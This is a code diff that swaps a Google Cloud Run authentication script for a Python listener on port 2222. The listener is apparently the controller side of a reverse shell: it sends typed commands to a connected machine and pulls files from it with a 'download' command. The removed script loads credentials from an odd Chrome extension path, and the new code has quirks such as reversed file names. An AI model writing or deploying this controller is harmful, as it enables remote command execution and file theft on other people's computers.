@@ -1,25 +1,39 @@
-def auth1():
-    try:
-        import google.auth
-        from google.oauth2 import id_token
-        from google.oauth2 import service_account
-        import google.auth.transport.requests
-        from google.auth.transport.requests import AuthorizedSession
-        target_audience = 'https://your-cloud-run-app.a.run.app'
-        url = 'https://your-cloud-run-app.a.run.app'
-        creds = service_account.IDTokenCredentials.from_service_account_file('C:\Program Files\Google\Chrome\Application\\103.0.5060.114\default_apps\external_extensions.json', target_audience=target_audience)
-        authed_session = AuthorizedSession(creds)
-        resp = authed_session.get(url)
-        print(resp.status_code)
-        print(resp.text)
-        request = google.auth.transport.requests.Request()
-        token = creds.token
-        print(token)
-        print(id_token.verify_token(token, request))
-    except Exception as err_msg:
-        print(err_msg)
-    finally:
-        print("**Execution Complete!**")
+import socket
+import colorama
 
+colorama.init()
 
-auth1()
+LHOST = "127.0.0.1"
+LPORT = 2222
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind((LHOST, LPORT))
+sock.listen(1)
+print("Listening on port", LPORT)
+client, addr = sock.accept()
+
+while True:
+    input_header = client.recv(1024)
+    command = input(input_header.decode()).encode()
+
+    if command.decode("utf-8").split(" ")[0] == "download":
+        file_name = command.decode("utf-8").split(" ")[1][::-1]
+        client.send(command)
+        with open(file_name, "wb") as f:
+            read_data = client.recv(1024)
+            while read_data:
+                f.write(read_data)
+                read_data = client.recv(1024)
+                if read_data == b"DONE":
+                    break
+
+    if command is b"":
+        print("Please enter a command")
+    else:
+        client.send(command)
+        data = client.recv(1024).decode("utf-8")
+        if data == "exit":
+            print("Terminating connection", addr[0])
+            break
+        print(data)
+client.close()
